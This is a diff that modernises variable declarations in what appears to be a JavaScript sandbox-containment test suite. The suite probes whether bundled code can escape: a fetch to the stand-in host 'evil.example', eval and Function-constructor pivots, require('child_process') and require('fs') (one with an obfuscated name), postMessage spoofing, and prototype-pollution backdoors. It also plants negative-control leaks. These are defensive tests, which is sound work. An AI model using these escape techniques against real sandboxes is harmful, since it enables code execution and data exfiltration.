@@ -14,7 +14,7 @@
 // provably inert / unreachable; a "DID NOT THROW" is a containment failure.
 function __whimRunProbes() {
   'use strict';
-  var results = [];
+  const results = [];
   function describe(v) {
     try {
       if (typeof v === 'function') return 'function';
@@ -25,12 +25,12 @@ function __whimRunProbes() {
   }
   function record(c, n, ok, d) { results.push({ category: c, name: n, ok: ok, detail: d }); }
   function expectThrow(c, n, fn) {
-    try { var v = fn(); record(c, n, false, 'DID NOT THROW → ' + describe(v)); }
+    try { const v = fn(); record(c, n, false, 'DID NOT THROW → ' + describe(v)); }
     catch (e) { record(c, n, true, 'threw ' + (e && e.name ? e.name : 'Error')); }
   }
   function expectUnreachable(c, n, fn) {
     try {
-      var v = fn();
+      const v = fn();
       if (v === null || v === undefined) record(c, n, true, 'unreachable → ' + describe(v));
       else record(c, n, false, 'REACHED a usable value → ' + describe(v));
     } catch (e) { record(c, n, true, 'blocked: ' + (e && e.name ? e.name : 'Error')); }
@@ -38,7 +38,7 @@ function __whimRunProbes() {
   // For the ALLOWED runtime surface ({vc-sdk, react, react-dom}): the module MUST resolve.
   function expectResolves(c, n, fn) {
     try {
-      var v = fn();
+      const v = fn();
       if (v !== null && v !== undefined) record(c, n, true, 'resolves (allowed runtime) → ' + describe(v));
       else record(c, n, false, 'expected to resolve but got ' + describe(v));
     } catch (e) { record(c, n, false, 'expected to resolve but threw ' + (e && e.name ? e.name : 'Error')); }
@@ -109,7 +109,7 @@ function __whimRunProbes() {
   // lexical) and the CSP must still close codegen.
   try {
     try { delete window.__WHIM_T1; } catch (e) {}
-    var t1src =
+    const t1src =
       'window.__WHIM_T1=(function(){var o={};' +
       'o.fetchType=typeof fetch;' +
       'try{fetch("https://evil.example/x");o.fetch="DID-NOT-THROW";}catch(e){o.fetch="threw:"+e.name;}' +
@@ -119,11 +119,11 @@ function __whimRunProbes() {
       'try{new RTCPeerConnection();o.rtc="DID-NOT-THROW";}catch(e){o.rtc="threw:"+e.name;}' +
       'try{eval("1+1");o.eval="DID-NOT-THROW";}catch(e){o.eval="threw:"+e.name;}' +
       'return o;})();';
-    var t1s = document.createElement('script');
+    const t1s = document.createElement('script');
     t1s.textContent = t1src;
     (document.head || document.documentElement).appendChild(t1s);
     if (t1s.parentNode) t1s.parentNode.removeChild(t1s);
-    var t1 = window.__WHIM_T1;
+    const t1 = window.__WHIM_T1;
     if (!t1) {
       record('pentest-T1', 'self-injected fresh <script> (did NOT execute)', true, 'fresh inline script blocked from running — no escape');
     } else {
@@ -142,14 +142,14 @@ function __whimRunProbes() {
 
   // T3 — pivot from the injected SDK global / reachable loader machinery to codegen/host.
   expectThrow('pentest-T3', 'pivot: vc-sdk proto → Function-constructor codegen', function () {
-    var sdk = window.__WHIM_VC_SDK__ || {};
-    var proto = Object.getPrototypeOf(sdk);
-    var ctor = proto && proto.constructor;
+    const sdk = window.__WHIM_VC_SDK__ || {};
+    const proto = Object.getPrototypeOf(sdk);
+    const ctor = proto && proto.constructor;
     if (!ctor || !ctor.constructor) throw new TypeError('no proto constructor to pivot through');
     return ctor.constructor('return globalThis.fetch')();
   });
   expectThrow('pentest-T3', 'pivot: window.__whimRequire → off-allowlist module', function () {
-    var req = window.__whimRequire || require;
+    const req = window.__whimRequire || require;
     return req('child_process');
   });
 
@@ -159,11 +159,11 @@ function __whimRunProbes() {
   expectThrow('pentest-T5', "require('vc-sdk/internals')  [SDK subpath]", function () { return require('vc-sdk/internals'); });
   expectThrow('pentest-T5', "require('vc-sdk/runtime')  [SDK internal module]", function () { return require('vc-sdk/runtime'); });
   expectThrow('pentest-T5', 'dynamic require(varName)  [computed specifier]', function () {
-    var name = ['ch', 'ild', '_pro', 'cess'].join('');
+    const name = ['ch', 'ild', '_pro', 'cess'].join('');
     return require(name);
   });
   expectThrow('pentest-T5', 'window.__whimRequire (off-allowlist via the real resolver)', function () {
-    var req = window.__whimRequire;
+    const req = window.__whimRequire;
     if (typeof req !== 'function') throw new TypeError('no __whimRequire to abuse');
     return req('fs');
   });
@@ -172,9 +172,9 @@ function __whimRunProbes() {
   // the host/transport design (the host must authenticate/ignore bundle-origin control frames).
   (function () {
     try {
-      var sawForeign = false;
-      var handler = function (ev) {
-        var d = ev && ev.data;
+      let sawForeign = false;
+      const handler = function (ev) {
+        const d = ev && ev.data;
         if (typeof d !== 'string') return;
         if (d.indexOf('__WHIM_T6_OWN__') !== -1) return;
         if (d.indexOf('__whimDeliver') !== -1) sawForeign = true;
@@ -192,7 +192,7 @@ function __whimRunProbes() {
     }
   })();
   (function () {
-    var canSpoof = false;
+    let canSpoof = false;
     try {
       if (window.parent && typeof window.parent.postMessage === 'function') {
         canSpoof = true;
@@ -214,13 +214,13 @@ function __whimRunProbes() {
   // (re-create the iframe per generation, constraint #5) a re-injected generation sees a
   // clean realm; without it, gen-1 markers persist. The trusted loader sets __whimGeneration.
   (function () {
-    var gen = (typeof window.__whimGeneration === 'number') ? window.__whimGeneration : null;
-    var backdoor = (typeof window.__WHIM_T7_BACKDOOR === 'function');
-    var protoPolluted = false;
+    const gen = (typeof window.__whimGeneration === 'number') ? window.__whimGeneration : null;
+    const backdoor = (typeof window.__WHIM_T7_BACKDOOR === 'function');
+    let protoPolluted = false;
     try { protoPolluted = ({}).__whimPwned === 'pwned-by-generation-1'; } catch (e) {}
-    var globalFlag = (window.__WHIM_T7_GLOBAL_FLAG === 'set-by-generation-1');
-    var anyPoison = backdoor || protoPolluted || globalFlag;
-    var detail =
+    const globalFlag = (window.__WHIM_T7_GLOBAL_FLAG === 'set-by-generation-1');
+    const anyPoison = backdoor || protoPolluted || globalFlag;
+    const detail =
       'generation=' + gen +
       ' backdoor=' + backdoor +
       ' Object.prototype.__whimPwned=' + protoPolluted +
@@ -243,23 +243,23 @@ function __whimRunProbes() {
 
   // 7a. NEGATIVE CONTROL — generic planted leak (the suite must flag a breach).
   window.__WHIM_PLANTED_LEAK__ = function () { return 'simulated native reach'; };
-  var i1 = results.length;
+  const i1 = results.length;
   expectThrow('negative-control', 'planted leak (should be flagged)', function () { return window.__WHIM_PLANTED_LEAK__(); });
-  var caughtGeneric = results[i1].ok === false;
+  const caughtGeneric = results[i1].ok === false;
   try { delete window.__WHIM_PLANTED_LEAK__; } catch (e) {}
 
   // 7b. DELIVERY-PATH negative control — simulate a loader that leaked a host handle.
   window.__WHIM_DELIVERY_LEAKED_HOST__ = { stolenBridge: function () { return 'host bridge'; } };
-  var i2 = results.length;
+  const i2 = results.length;
   expectUnreachable('negative-control', 'delivery-leaked host handle (should be flagged)', function () {
     return window.__WHIM_DELIVERY_LEAKED_HOST__ && window.__WHIM_DELIVERY_LEAKED_HOST__.stolenBridge();
   });
-  var caughtDelivery = results[i2].ok === false;
+  const caughtDelivery = results[i2].ok === false;
   try { delete window.__WHIM_DELIVERY_LEAKED_HOST__; } catch (e) {}
 
   // 8. dynamic import() must reject (no module loads under the CSP) — also kills H3.
-  var importProbe = new Promise(function (resolve) {
-    var p;
+  const importProbe = new Promise(function (resolve) {
+    let p;
     try { p = import('data:text/javascript,export default 1'); }
     catch (e) { record('codegen', 'import()', true, 'threw synchronously: ' + (e && e.name)); return resolve(); }
     Promise.resolve(p).then(
@@ -271,10 +271,10 @@ function __whimRunProbes() {
   return importProbe.then(function () {
     // `contained` counts the ESCAPE-axis probes only. Excluded: negative-control (supposed to
     // fail), pentest-T7-info (same-realm persistence is not a network/codegen/native escape).
-    var EXCLUDED = { 'negative-control': true, 'pentest-T7-info': true };
-    var real = results.filter(function (r) { return !EXCLUDED[r.category]; });
-    var failed = real.filter(function (r) { return !r.ok; });
-    var t7 = window.__WHIM_T7_RESULT__ || null;
+    const EXCLUDED = { 'negative-control': true, 'pentest-T7-info': true };
+    const real = results.filter(function (r) { return !EXCLUDED[r.category]; });
+    const failed = real.filter(function (r) { return !r.ok; });
+    const t7 = window.__WHIM_T7_RESULT__ || null;
     return {
       neutralizeReport: window.__WHIM_NEUTRALIZE_REPORT__ || null,
       probes: results,
